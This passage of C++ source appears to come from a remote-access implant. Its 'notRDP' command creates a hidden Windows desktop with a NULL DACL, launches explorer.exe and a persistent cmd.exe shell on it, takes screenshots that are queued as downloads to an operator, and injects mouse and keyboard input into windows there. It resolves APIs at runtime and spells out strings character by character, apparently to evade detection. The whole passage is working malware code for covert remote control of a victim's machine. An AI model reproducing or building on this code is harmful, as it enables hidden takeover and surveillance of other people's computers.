  auto get_metrics = reinterpret_cast<fn_GetSystemMetrics>(
      inst.kernel32.GetProcAddress(reinterpret_cast<HMODULE>(h_user32),
                                   symbol<LPCSTR>("GetSystemMetrics")));
  if (!get_metrics)
    return false;

  int32_t width = get_metrics(NR_SM_CXSCREEN);
  int32_t height = get_metrics(NR_SM_CYSCREEN);
  if (width <= 0 || height <= 0) {
    width = 1920;
    height = 1080;
  }
  state->live_w = static_cast<uint32_t>(width);
  state->live_h = static_cast<uint32_t>(height);
  state->live_fps = fps;
  state->live_scale = scale;
  state->live_sock = NR_LIVE_INVALID;

  auto ctx = static_cast<NrLiveCtx *>(inst.heap_alloc(sizeof(NrLiveCtx)));
  if (!ctx)
    return false;
  memory::zero(ctx, sizeof(NrLiveCtx));
  ctx->inst = &inst;
  ctx->state = state;
  uint32_t host_len = 0;
  while (host[host_len] && host_len < sizeof(ctx->host) - 1) {
    ctx->host[host_len] = host[host_len];
    host_len++;
  }
  ctx->host[host_len] = 0;
  ctx->port = port;

  InterlockedExchange(&state->live_running, 1);
  state->live_thread = inst.kernel32.CreateThread(
      nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(nr_live_thread), ctx,
      0, nullptr);
  if (!state->live_thread) {
    InterlockedExchange(&state->live_running, 0);
    inst.heap_free(ctx);
    return false;
  }
  return true;
}

/* ── launch explorer.exe on the hidden desktop ── */
static auto declfn nr_launch_explorer(instance &inst, NotRdpState *state,
                                      uint32_t *err_out) -> bool {
  auto pCreateProcessW =
      reinterpret_cast<fn_CreateProcessW>(inst.kernel32.GetProcAddress(
          reinterpret_cast<HMODULE>(inst.kernel32.handle),
          symbol<LPCSTR>("CreateProcessW")));

  if (!pCreateProcessW) {
    *err_out = 0xFFFFFFFF;
    return false;
  }

  /* Launch explorer.exe with STARTUPINFOW.lpDesktop =
   * "WinSta0\\StarburstHidden" — si.lpDesktop tells Windows to launch
   * on that desktop. No thread desktop switch needed. */
  wchar_t w_cmd[16] = {};
  wchar_t exp[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e',
                   'r', '.', 'e', 'x', 'e', 0};
  memory::copy(w_cmd, exp, 26);

  wchar_t w_desktop_path[64];
  memory::zero(w_desktop_path, 128);
  /* Desktop name only (no WinSta0\ prefix): the child then launches on
   * that desktop within the CALLING process's window station, which is
   * where CreateDesktopW created it. */
  memory::copy(w_desktop_path, (void *)NR_DESKTOP_NAME, 32);

  /* Build STARTUPINFOW with lpDesktop pointing to hidden desktop.
   * Do NOT switch the calling thread's desktop — si.lpDesktop handles it.
   * STARTUPINFOW x64 layout: cb(0), lpReserved(8), lpDesktop(16) */
  uint8_t si_buf[104] = {};
  *(uint32_t *)(si_buf) = 104; /* cb */
  *(uint64_t *)(si_buf + 16) = (uint64_t)w_desktop_path;

  uint8_t pi_buf[24] = {};

  bool ok =
      pCreateProcessW(nullptr, w_cmd, nullptr, nullptr, 0,
                      NR_CREATE_NEW_CONSOLE, nullptr, nullptr, si_buf, pi_buf);

  if (ok) {
    state->h_explorer_proc = *(HANDLE *)(pi_buf);
    state->explorer_pid = *(uint32_t *)(pi_buf + 16);
  } else {
    *err_out = inst.kernel32.GetLastError();
  }

  /* explorer.exe self-exits when launched as SYSTEM on a secondary desktop.
   * Launch cmd.exe /k as a persistent shell so the desktop has a live
   * window to capture and interact with. */
  wchar_t w_cmd2[24] = {};
  wchar_t cmdstr[] = {'c', 'm', 'd', '.', 'e', 'x', 'e', ' ', '/', 'k', 0};
  memory::copy(w_cmd2, cmdstr, 22);
  uint8_t pi2[24] = {};
  if (pCreateProcessW(nullptr, w_cmd2, nullptr, nullptr, 0,
                      NR_CREATE_NEW_CONSOLE, nullptr, nullptr, si_buf, pi2)) {
    state->h_shell_proc = *(HANDLE *)(pi2);
    state->shell_pid = *(uint32_t *)(pi2 + 16);
  } else if (!ok) {
    *err_out = inst.kernel32.GetLastError();
  }

  return ok;
}

/* ── capture a BMP screenshot of the hidden desktop ── */
static auto declfn nr_capture(instance &inst, NotRdpState *state,
                              char *task_uuid) -> void {
  STK_USER32(_u32);
  STK_GDI32(_g32);

  auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
  auto h_gdi32 = inst.kernel32.LoadLibraryA(_g32);
  if (!h_user32 || !h_gdi32) {
    queue_response(
        inst, task_uuid, RESPONSE_ERROR,
        symbol<char *>(const_cast<char *>("user32/gdi32 load failed")));
    return;
  }

  auto pOpenDesk = reinterpret_cast<fn_OpenDesktopW>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("OpenDesktopW")));
  auto pSetThreadDesk =
      reinterpret_cast<fn_SetThreadDesktop>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("SetThreadDesktop")));
  auto pGetThreadDesk =
      reinterpret_cast<fn_GetThreadDesktop>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("GetThreadDesktop")));
  auto pGetCurThreadId =
      reinterpret_cast<uint32_t(WINAPI *)(void)>(inst.kernel32.GetProcAddress(
          reinterpret_cast<HMODULE>(inst.kernel32.handle),
          symbol<LPCSTR>("GetCurrentThreadId")));
  auto pCloseDesk = reinterpret_cast<fn_CloseDesktop>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("CloseDesktop")));
  auto pGetDC = reinterpret_cast<fn_GetDC>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("GetDC")));
  auto pReleaseDC = reinterpret_cast<int(WINAPI *)(void *, HDC)>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("ReleaseDC")));
  auto pGetSysMetrics =
      reinterpret_cast<fn_GetSystemMetrics>(inst.kernel32.GetProcAddress(
          h_user32, symbol<LPCSTR>("GetSystemMetrics")));
  auto pCreateCompatDC =
      reinterpret_cast<fn_CreateCompatibleDC>(inst.kernel32.GetProcAddress(
          h_gdi32, symbol<LPCSTR>("CreateCompatibleDC")));
  auto pCreateCompatBitmap =
      reinterpret_cast<fn_CreateCompatibleBitmap>(inst.kernel32.GetProcAddress(
          h_gdi32, symbol<LPCSTR>("CreateCompatibleBitmap")));
  auto pSelectObject = reinterpret_cast<fn_SelectObject>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("SelectObject")));
  auto pBitBlt = reinterpret_cast<fn_BitBlt>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("BitBlt")));
  auto pGetDIBits = reinterpret_cast<fn_GetDIBits>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("GetDIBits")));
  auto pDeleteObject = reinterpret_cast<fn_DeleteObject>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("DeleteObject")));
  auto pDeleteDC = reinterpret_cast<fn_DeleteDC>(
      inst.kernel32.GetProcAddress(h_gdi32, symbol<LPCSTR>("DeleteDC")));

  if (!pOpenDesk || !pSetThreadDesk || !pGetThreadDesk || !pGetCurThreadId ||
      !pCloseDesk || !pGetDC || !pReleaseDC || !pGetSysMetrics ||
      !pCreateCompatDC || !pCreateCompatBitmap || !pSelectObject || !pBitBlt ||
      !pGetDIBits || !pDeleteObject || !pDeleteDC) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("gdi resolve failed")));
    return;
  }

  /* Read screen metrics from the DEFAULT desktop BEFORE switching —
   * a freshly created hidden desktop has no monitor and returns 0. */
  int width = pGetSysMetrics(NR_SM_CXSCREEN);
  int height = pGetSysMetrics(NR_SM_CYSCREEN);
  if (width <= 0 || height <= 0) {
    width = 1920;
    height = 1080;
  }

  /* Switch to hidden desktop */
  wchar_t w_desk_name[32];
  memory::zero(w_desk_name, 64);
  nr_to_wide(inst, "StarburstHidden", w_desk_name, 32);

  void *h_orig = pGetThreadDesk(pGetCurThreadId());
  /* needs DESKTOP_SWITCHDESKTOP for the SwitchDesktop render blip below */
  void *h_desk = pOpenDesk(w_desk_name, 0, 0,
                           NR_DESKTOP_READOBJECTS | NR_DESKTOP_WRITEOBJECTS |
                               NR_DESKTOP_SWITCHDESKTOP);
  if (!h_desk) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("open desktop failed")));
    return;
  }
  pSetThreadDesk(h_desk);

  /* DWM only renders the ACTIVE desktop — make the hidden desktop active
   * briefly so BitBlt sees content, then restore the user's desktop.
   * This causes a short visual blip on the console (~blip ms). */
  auto pSwitchDesk = reinterpret_cast<fn_SwitchDesktop>(
      inst.kernel32.GetProcAddress(h_user32, symbol<LPCSTR>("SwitchDesktop")));
  auto pSleep =
      reinterpret_cast<void(WINAPI *)(uint32_t)>(inst.kernel32.GetProcAddress(
          reinterpret_cast<HMODULE>(inst.kernel32.handle),
          symbol<LPCSTR>("Sleep")));
  int switched = 0;
  if (pSwitchDesk && pSwitchDesk(h_desk)) {
    switched = 1;
    if (pSleep)
      pSleep(NR_SWITCH_BLIP_MS);
  }

  HDC h_screen = pGetDC(nullptr);
  if (!h_screen) {
    if (switched)
      pSwitchDesk(h_orig);
    pSetThreadDesk(h_orig);
    pCloseDesk(h_desk);
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("getdc failed")));
    return;
  }

  HDC h_mem = pCreateCompatDC(h_screen);
  if (!h_mem) {
    pReleaseDC(nullptr, h_screen);
    if (switched)
      pSwitchDesk(h_orig);
    pSetThreadDesk(h_orig);
    pCloseDesk(h_desk);
    queue_response(
        inst, task_uuid, RESPONSE_ERROR,
        symbol<char *>(const_cast<char *>("create compat dc failed")));
    return;
  }

  HGDIOBJ h_bitmap = pCreateCompatBitmap(h_screen, width, height);
  if (!h_bitmap) {
    pDeleteDC(h_mem);
    pReleaseDC(nullptr, h_screen);
    if (switched)
      pSwitchDesk(h_orig);
    pSetThreadDesk(h_orig);
    pCloseDesk(h_desk);
    queue_response(
        inst, task_uuid, RESPONSE_ERROR,
        symbol<char *>(const_cast<char *>("create compat bitmap failed")));
    return;
  }

  HGDIOBJ h_old = pSelectObject(h_mem, h_bitmap);
  pBitBlt(h_mem, 0, 0, width, height, h_screen, 0, 0, NR_SRCCOPY);

  NR_BITMAPINFOHEADER bmi = {};
  bmi.biSize = NR_BITMAPINFOHEADER_SIZE;
  bmi.biWidth = width;
  bmi.biHeight = height;
  bmi.biPlanes = 1;
  bmi.biBitCount = 24;
  bmi.biCompression = 0;

  pGetDIBits(h_mem, h_bitmap, 0, 0, nullptr, &bmi, 0);

  uint32_t row_size = ((width * 3 + 3) & ~3);
  uint32_t data_size = row_size * height;
  uint32_t bmp_size =
      NR_BITMAPFILEHEADER_SIZE + NR_BITMAPINFOHEADER_SIZE + data_size;

  auto bmp_buf = static_cast<uint8_t *>(inst.heap_alloc(bmp_size));
  if (!bmp_buf) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("bmp alloc failed")));
    goto cleanup_gdi;
  }

  memory::zero(bmp_buf, bmp_size);

  /* BITMAPFILEHEADER (14 bytes) */
  bmp_buf[0] = 0x42;
  bmp_buf[1] = 0x4D;
  *(uint32_t *)(bmp_buf + 2) = bmp_size;
  *(uint32_t *)(bmp_buf + 10) =
      NR_BITMAPFILEHEADER_SIZE + NR_BITMAPINFOHEADER_SIZE;

  /* BITMAPINFOHEADER */
  memory::copy(bmp_buf + NR_BITMAPFILEHEADER_SIZE, &bmi,
               NR_BITMAPINFOHEADER_SIZE);

  /* Pixel data */
  pGetDIBits(h_mem, h_bitmap, 0, height,
             bmp_buf + NR_BITMAPFILEHEADER_SIZE + NR_BITMAPINFOHEADER_SIZE,
             &bmi, 0);

  /* Queue as chunked file download */
  {
    /* Must match CHUNK_SIZE used by cmd_download_resp when sending chunks */
    uint32_t total_chunks = (bmp_size + CHUNK_SIZE - 1) / CHUNK_SIZE;

    int slot = -1;
    for (uint32_t s = 0; s < inst.MAX_PENDING_DOWNLOADS; s++) {
      if (!inst.downloads.entries[s].active) {
        slot = static_cast<int>(s);
        break;
      }
    }

    if (slot < 0) {
      inst.heap_free(bmp_buf);
      queue_response(
          inst, task_uuid, RESPONSE_ERROR,
          symbol<char *>(const_cast<char *>("too many pending downloads")));
      goto cleanup_gdi;
    }

    /* Store pending download state (in-memory buffer).
     * bmp_buf ownership transfers to cmd_download_resp — do NOT free here. */
    {
      auto &dl = inst.downloads.entries[slot];
      memory::copy(dl.task_uuid, task_uuid, 36);
      dl.task_uuid[36] = '\0';
      dl.h_file = INVALID_HANDLE_VALUE;
      dl.mem_buf = bmp_buf;
      dl.total_size = bmp_size;
      dl.total_chunks = total_chunks;
      dl.is_mem = true;
      dl.active = true;
    }

    auto pkg = package_create(inst);
    package_add_byte(inst, pkg, ACTION_POST_RESPONSE);
    package_add_string(inst, pkg, task_uuid);
    package_add_byte(inst, pkg, RESPONSE_PROCESSING);
    package_add_byte(inst, pkg, DOWNLOAD_INIT);
    package_add_int32(inst, pkg, total_chunks);
    package_add_int32(inst, pkg, bmp_size);
    package_add_string(inst, pkg,
                       symbol<char *>(const_cast<char *>("notrdp_frame.bmp")));

    uint32_t data_len = 0;
    auto data = package_build(pkg, &data_len);

    uint32_t needed = inst.response_queue.length + 4 + data_len;
    if (needed > inst.response_queue.capacity) {
      uint32_t new_cap = inst.response_queue.capacity == 0
                             ? 1024
                             : inst.response_queue.capacity;
      while (new_cap < needed)
        new_cap *= 2;
      inst.response_queue.buffer = static_cast<uint8_t *>(
          inst.heap_realloc(inst.response_queue.buffer, new_cap));
      inst.response_queue.capacity = new_cap;
    }

    auto qbuf = inst.response_queue.buffer + inst.response_queue.length;
    qbuf[0] = (data_len >> 24) & 0xFF;
    qbuf[1] = (data_len >> 16) & 0xFF;
    qbuf[2] = (data_len >> 8) & 0xFF;
    qbuf[3] = data_len & 0xFF;
    memory::copy(qbuf + 4, data, data_len);
    inst.response_queue.length += 4 + data_len;
    package_destroy(inst, pkg);
  }

cleanup_gdi:
  /* bmp_buf ownership is with the pending download (cmd_download_resp frees
   * it after the last chunk). Only GDI objects are released here. */
  pSelectObject(h_mem, h_old);
  pDeleteObject(h_bitmap);
  pDeleteDC(h_mem);
  pReleaseDC(nullptr, h_screen);
  if (switched)
    pSwitchDesk(h_orig);
  pSetThreadDesk(h_orig);
  pCloseDesk(h_desk);
}

/* ── inject mouse/keyboard input via PostMessage ── */
static auto declfn nr_init_input_apis(instance &inst, NrInputApis *apis)
    -> bool {
  memory::zero(apis, sizeof(NrInputApis));

  STK_USER32(_u32);
  auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
  if (!h_user32)
    return false;
  auto user32 = reinterpret_cast<HMODULE>(h_user32);
  auto kernel32 = reinterpret_cast<HMODULE>(inst.kernel32.handle);
  auto gpa = inst.kernel32.GetProcAddress;

  apis->set_thread_desktop = reinterpret_cast<fn_SetThreadDesktop>(
      gpa(user32, symbol<LPCSTR>("SetThreadDesktop")));
  apis->get_thread_desktop = reinterpret_cast<fn_GetThreadDesktop>(
      gpa(user32, symbol<LPCSTR>("GetThreadDesktop")));
  apis->get_current_thread_id = reinterpret_cast<fn_GetCurrentThreadId>(
      gpa(kernel32, symbol<LPCSTR>("GetCurrentThreadId")));
  apis->post_message = reinterpret_cast<fn_PostMessageW>(
      gpa(user32, symbol<LPCSTR>("PostMessageW")));
  apis->window_from_point = reinterpret_cast<fn_WindowFromPoint>(
      gpa(user32, symbol<LPCSTR>("WindowFromPoint")));
  apis->screen_to_client = reinterpret_cast<fn_ScreenToClient>(
      gpa(user32, symbol<LPCSTR>("ScreenToClient")));
  apis->child_from_point = reinterpret_cast<fn_ChildWindowFromPointEx>(
      gpa(user32, symbol<LPCSTR>("ChildWindowFromPointEx")));
  apis->get_window_thread = reinterpret_cast<fn_GetWindowThreadProcessId>(
      gpa(user32, symbol<LPCSTR>("GetWindowThreadProcessId")));
  apis->attach_thread_input = reinterpret_cast<fn_AttachThreadInput>(
      gpa(user32, symbol<LPCSTR>("AttachThreadInput")));
  apis->set_focus =
      reinterpret_cast<fn_SetFocus>(gpa(user32, symbol<LPCSTR>("SetFocus")));
  apis->map_virtual_key = reinterpret_cast<fn_MapVirtualKeyA>(
      gpa(user32, symbol<LPCSTR>("MapVirtualKeyA")));

  const void *required[11] = {
      (const void *)apis->set_thread_desktop,
      (const void *)apis->get_thread_desktop,
      (const void *)apis->get_current_thread_id,
      (const void *)apis->post_message,
      (const void *)apis->window_from_point,
      (const void *)apis->screen_to_client,
      (const void *)apis->child_from_point,
      (const void *)apis->get_window_thread,
      (const void *)apis->attach_thread_input,
      (const void *)apis->set_focus,
      (const void *)apis->map_virtual_key,
  };
  for (uint32_t i = 0; i < 11; i++) {
    if (!required[i])
      return false;
  }
  return true;
}

static auto declfn nr_is_extended_key(int32_t key) -> bool {
  switch (key) {
  case 33:  /* VK_PRIOR */
  case 34:  /* VK_NEXT */
  case 35:  /* VK_END */
  case 36:  /* VK_HOME */
  case 37:  /* VK_LEFT */
  case 38:  /* VK_UP */
  case 39:  /* VK_RIGHT */
  case 40:  /* VK_DOWN */
  case 44:  /* VK_SNAPSHOT */
  case 45:  /* VK_INSERT */
  case 46:  /* VK_DELETE */
  case 91:  /* VK_LWIN */
  case 92:  /* VK_RWIN */
  case 93:  /* VK_APPS */
  case 111: /* VK_DIVIDE */
  case 144: /* VK_NUMLOCK */
    return true;
  default:
    return false;
  }
}

static auto declfn nr_input_resolved(NotRdpState *state, NrInputApis *apis,
                                     int32_t x, int32_t y, int32_t action,
                                     int32_t key) -> void {
  void *original_desktop =
      apis->get_thread_desktop(apis->get_current_thread_id());
  if (!original_desktop)
    return;

  bool switched = original_desktop != state->h_desktop;
  if (switched && !apis->set_thread_desktop(state->h_desktop))
    return;

  NrPoint screen_point = {x, y};
  void *target = apis->window_from_point(screen_point);
  if (target) {
    const uint32_t child_flags =
        NR_CWP_SKIPINVISIBLE | NR_CWP_SKIPDISABLED | NR_CWP_SKIPTRANSPARENT;
    for (uint32_t depth = 0; depth < 8; depth++) {
      NrPoint child_point = {x, y};
      if (!apis->screen_to_client(target, &child_point))
        break;
      void *child = apis->child_from_point(target, child_point, child_flags);
      if (!child || child == target)
        break;
      target = child;
    }

    NrPoint client_point = {x, y};
    if (apis->screen_to_client(target, &client_point)) {
      uint32_t packed_point =
          static_cast<uint16_t>(client_point.x) |
          (static_cast<uint32_t>(static_cast<uint16_t>(client_point.y)) << 16);
      intptr_t mouse_lparam =
          static_cast<intptr_t>(static_cast<uintptr_t>(packed_point));

      if (action >= 1 && action <= 7) {
        uint32_t target_thread = apis->get_window_thread(target, nullptr);
        uint32_t current_thread = apis->get_current_thread_id();
        if (target_thread && target_thread != current_thread) {
          int attached =
              apis->attach_thread_input(current_thread, target_thread, 1);
          apis->set_focus(target);
          if (attached)
            apis->attach_thread_input(current_thread, target_thread, 0);
        } else {
          apis->set_focus(target);
        }
      }

      switch (action) {
      case 0:
        apis->post_message(target, NR_WM_MOUSEMOVE,
                           static_cast<uintptr_t>(key) &
                               (NR_MK_LBUTTON | NR_MK_RBUTTON),
                           mouse_lparam);
        break;
      case 1:
        apis->post_message(target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON,
                           mouse_lparam);
        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
        break;
      case 2:
        apis->post_message(target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON,
                           mouse_lparam);
        apis->post_message(target, NR_WM_RBUTTONUP, 0, mouse_lparam);
        break;
      case 3:
        apis->post_message(target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON,
                           mouse_lparam);
        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
        apis->post_message(target, NR_WM_LBUTTONDBLCLK, NR_MK_LBUTTON,
                           mouse_lparam);
        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
        break;
      case 4:
        apis->post_message(target, NR_WM_LBUTTONDOWN, NR_MK_LBUTTON,
                           mouse_lparam);
        break;
      case 5:
        apis->post_message(target, NR_WM_LBUTTONUP, 0, mouse_lparam);
        break;
      case 6:
        apis->post_message(target, NR_WM_RBUTTONDOWN, NR_MK_RBUTTON,
                           mouse_lparam);
        break;
      case 7:
        apis->post_message(target, NR_WM_RBUTTONUP, 0, mouse_lparam);
        break;
      case 8: {
        uintptr_t wheel_wparam = static_cast<uintptr_t>(
            static_cast<uint32_t>(static_cast<uint16_t>(key)) << 16);
        intptr_t wheel_lparam = static_cast<intptr_t>(static_cast<uintptr_t>(
            static_cast<uint16_t>(x) |
            (static_cast<uint32_t>(static_cast<uint16_t>(y)) << 16)));
        apis->post_message(target, NR_WM_MOUSEWHEEL, wheel_wparam,
                           wheel_lparam);
        break;
      }
      case 10:
      case 11:
      case 12:
        if (key > 0) {
          uint32_t scan = apis->map_virtual_key(static_cast<uint32_t>(key), 0);
          uint32_t key_lparam = 1 | ((scan & 0xFF) << 16);
          if (nr_is_extended_key(key))
            key_lparam |= 1u << 24;
          intptr_t key_down =
              static_cast<intptr_t>(static_cast<uintptr_t>(key_lparam));
          intptr_t key_up = static_cast<intptr_t>(
              static_cast<uintptr_t>(key_lparam | (1u << 30) | (1u << 31)));
          if (action == 10 || action == 11)
            apis->post_message(target, NR_WM_KEYDOWN,
                               static_cast<uintptr_t>(key), key_down);
          if (action == 10 || action == 12)
            apis->post_message(target, NR_WM_KEYUP, static_cast<uintptr_t>(key),
                               key_up);
        }
        break;
      }
    }
  }

  if (switched)
    apis->set_thread_desktop(original_desktop);
}

static auto declfn nr_input(instance &inst, NotRdpState *state, int32_t x,
                            int32_t y, int32_t action, int32_t key) -> void {
  NrInputApis apis;
  if (nr_init_input_apis(inst, &apis))
    nr_input_resolved(state, &apis, x, y, action, key);
}

/* ── teardown ── */
static auto declfn nr_stop(instance &inst, NotRdpState *state) -> void {
  if (state->live_running || state->live_thread)
    nr_live_stop(inst, state);

  if (state->h_shell_proc) {
    auto pTerm =
        reinterpret_cast<fn_TerminateProcess>(inst.kernel32.GetProcAddress(
            reinterpret_cast<HMODULE>(inst.kernel32.handle),
            symbol<LPCSTR>("TerminateProcess")));
    if (pTerm)
      pTerm(state->h_shell_proc, 0);
    inst.kernel32.CloseHandle(state->h_shell_proc);
    state->h_shell_proc = nullptr;
  }
  if (state->h_explorer_proc) {
    auto pTerminate =
        reinterpret_cast<fn_TerminateProcess>(inst.kernel32.GetProcAddress(
            reinterpret_cast<HMODULE>(inst.kernel32.handle),
            symbol<LPCSTR>("TerminateProcess")));
    if (pTerminate)
      pTerminate(state->h_explorer_proc, 0);
    inst.kernel32.CloseHandle(state->h_explorer_proc);
    state->h_explorer_proc = nullptr;
  }

  if (state->h_desktop) {
    STK_USER32(_u32s);
    auto h_user32s = inst.kernel32.LoadLibraryA(_u32s);
    auto pCloseDesk = reinterpret_cast<fn_CloseDesktop>(
        h_user32s ? inst.kernel32.GetProcAddress(h_user32s,
                                                 symbol<LPCSTR>("CloseDesktop"))
                  : nullptr);
    if (pCloseDesk)
      pCloseDesk(state->h_desktop);
    state->h_desktop = nullptr;
  }

  state->active = false;
  inst.heap_free(state);
  inst.notrdp_state_ptr = nullptr;
}

/* ── main command handler ── */
auto declfn starburst::cmd_notrdp(_Inout_ instance &inst, _In_ char *task_uuid,
                                  _In_ Parser *params) -> void {
  uint32_t action_len = 0;
  auto action = parser_string(params, &action_len);

  if (!action || action_len == 0) {
    queue_response(inst, task_uuid, RESPONSE_ERROR,
                   symbol<char *>(const_cast<char *>("missing action")));
    return;
  }

  /* ── START ── */
  char start_s[] = {'s', 't', 'a', 'r', 't', 0};
  if (str_ncmp(action, start_s, 5) == 0) {
    auto cur = static_cast<NotRdpState *>(inst.notrdp_state_ptr);
    if (cur) {
      queue_response(
          inst, task_uuid, RESPONSE_ERROR,
          symbol<char *>(const_cast<char *>("notRDP already running")));
      return;
    }

    auto state =
        static_cast<NotRdpState *>(inst.heap_alloc(sizeof(NotRdpState)));
    if (!state) {
      queue_response(inst, task_uuid, RESPONSE_ERROR,
                     symbol<char *>(const_cast<char *>("heap alloc failed")));
      return;
    }
    memory::zero(state, sizeof(NotRdpState));

    STK_USER32(_u32);
    auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
    if (!h_user32) {
      inst.heap_free(state);
      queue_response(inst, task_uuid, RESPONSE_ERROR,
                     symbol<char *>(const_cast<char *>("user32 load failed")));
      return;
    }

    auto pCreateDesktop =
        reinterpret_cast<fn_CreateDesktopW>(inst.kernel32.GetProcAddress(
            h_user32, symbol<LPCSTR>("CreateDesktopW")));
    if (!pCreateDesktop) {
      inst.heap_free(state);
      queue_response(
          inst, task_uuid, RESPONSE_ERROR,
          symbol<char *>(const_cast<char *>("CreateDesktopW not found")));
      return;
    }

    /* Create the hidden desktop. dwFlags must be 0 for CreateDesktopW.
     * Explicit SECURITY_ATTRIBUTES with a NULL DACL — everyone full access,
     * same as the original notRDP, so child processes on the desktop and
     * later agent instances can always open it.
     * SECURITY_DESCRIPTOR is 40 bytes on x64; SECURITY_ATTRIBUTES 24. */
    STK_ADVAPI32(_adv);
    auto h_adv = inst.kernel32.LoadLibraryA(_adv);
    uint8_t sa_buf[24] = {};
    uint8_t *sd_ptr = nullptr;
    if (h_adv) {
      auto pInitSD = reinterpret_cast<fn_InitializeSecurityDescriptor>(
          inst.kernel32.GetProcAddress(
              h_adv, symbol<LPCSTR>("InitializeSecurityDescriptor")));
      auto pSetDacl = reinterpret_cast<fn_SetSecurityDescriptorDacl>(
          inst.kernel32.GetProcAddress(
              h_adv, symbol<LPCSTR>("SetSecurityDescriptorDacl")));
      if (pInitSD && pSetDacl) {
        auto sd_buf = static_cast<uint8_t *>(inst.heap_alloc(64));
        if (sd_buf) {
          memory::zero(sd_buf, 64);
          pInitSD(sd_buf, NR_SEC_DESCRIPTOR);
          /* DACL = NULL -> grant everyone full access */
          pSetDacl(sd_buf, 1, nullptr, 0);
          *(uint32_t *)(sa_buf) = 24;
          *(uint64_t *)(sa_buf + 8) = (uint64_t)sd_buf;
          *(uint8_t *)(sa_buf + 16) = 0;
          sd_ptr = sd_buf;
        }
      }
    }

    state->h_desktop =
        pCreateDesktop(NR_DESKTOP_NAME, nullptr, nullptr, 0, NR_DESKTOP_ALL,
                       sd_ptr ? sa_buf : nullptr);
    if (sd_ptr)
      inst.heap_free(sd_ptr);

    if (!state->h_desktop) {
      uint32_t cd_err = inst.kernel32.GetLastError();
      auto pOpenDesk =
          reinterpret_cast<fn_OpenDesktopW>(inst.kernel32.GetProcAddress(
              h_user32, symbol<LPCSTR>("OpenDesktopW")));
      if (pOpenDesk) {
        wchar_t w_dn[32];
        memory::zero(w_dn, 64);
        nr_to_wide(inst, "StarburstHidden", w_dn, 32);
        state->h_desktop = pOpenDesk(w_dn, 0, 0, NR_DESKTOP_ALL);
        if (!state->h_desktop)
          state->h_desktop =
              pOpenDesk(w_dn, 0, 0,
                        NR_DESKTOP_READOBJECTS | NR_DESKTOP_WRITEOBJECTS |
                            NR_DESKTOP_SWITCHDESKTOP | NR_WRITE_DAC);
      }
      if (!state->h_desktop) {
        inst.heap_free(state);
        char errbuf[48] = {};
        const char msg_s[] = {'C', 'r', 'e', 'a', 't', 'e', 'D', 'e',
                              's', 'k', 't', 'o', 'p', 'W', ' ', 'f',
                              'a', 'i', 'l', 'e', 'd', ' ', 0};
        memory::copy(errbuf, (void *)msg_s, 23);
        char digits[12] = {};
        uint32_t v = cd_err;
        int di = 0;
        if (v == 0)
          digits[di++] = '0';
        while (v > 0) {
          digits[di++] = static_cast<char>('0' + (v % 10));
          v /= 10;
        }
        int bi = 22;
        for (int k = di - 1; k >= 0; k--)
          errbuf[bi++] = digits[k];
        errbuf[bi] = 0;
        queue_response(inst, task_uuid, RESPONSE_ERROR,
                       symbol<char *>(const_cast<char *>(errbuf)));
        return;
      }
    }

    /* Launch explorer.exe on the hidden desktop */
    uint32_t launch_err = 0;
    if (!nr_launch_explorer(inst, state, &launch_err)) {
      auto pCloseDesk =
          reinterpret_cast<fn_CloseDesktop>(inst.kernel32.GetProcAddress(
              h_user32, symbol<LPCSTR>("CloseDesktop")));
      if (pCloseDesk)
        pCloseDesk(state->h_desktop);
      inst.heap_free(state);
      /* format "explorer launch failed <code>" */
      char errbuf[48] = {};
      const char msg_s[] = {'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r',
                            ' ', 'l', 'a', 'u', 'n', 'c', 'h', ' ',
                            'f', 'a', 'i', 'l', 'e', 'd', ' ', 0};
      memory::copy(errbuf, (void *)msg_s, 24);
      char digits[12] = {};
      uint32_t v = launch_err;
      int di = 0;
      if (v == 0) {
        digits[di++] = '0';
      }
      while (v > 0) {
        digits[di++] = static_cast<char>('0' + (v % 10));
        v /= 10;
      }
      int bi = 23;
      for (int k = di - 1; k >= 0 && bi < 46; k--)
        errbuf[bi++] = digits[k];
      errbuf[bi] = 0;
      queue_response(inst, task_uuid, RESPONSE_ERROR,
                     symbol<char *>(const_cast<char *>(errbuf)));
      return;
    }

    state->active = true;
    inst.notrdp_state_ptr = state;

    {
      char okbuf[96] = {};
      const char ok_s[] = {'h', 'i', 'd', 'd', 'e', 'n', ' ', 'd',
                           'e', 's', 'k', 't', 'o', 'p', ' ', 'e',
                           'x', 'p', 'i', 'd', '=', 0};
      memory::copy(okbuf, (void *)ok_s, 22);
      char digits[12] = {};
      uint32_t v = state->explorer_pid;
      int di = 0;
      if (v == 0)
        digits[di++] = '0';
      while (v > 0) {
        digits[di++] = static_cast<char>('0' + (v % 10));
        v /= 10;
      }
      int bi = 21;
      for (int k = di - 1; k >= 0; k--)
        okbuf[bi++] = digits[k];
      const char shell_s[] = {' ', 's', 'h', 'e', 'l', 'l',
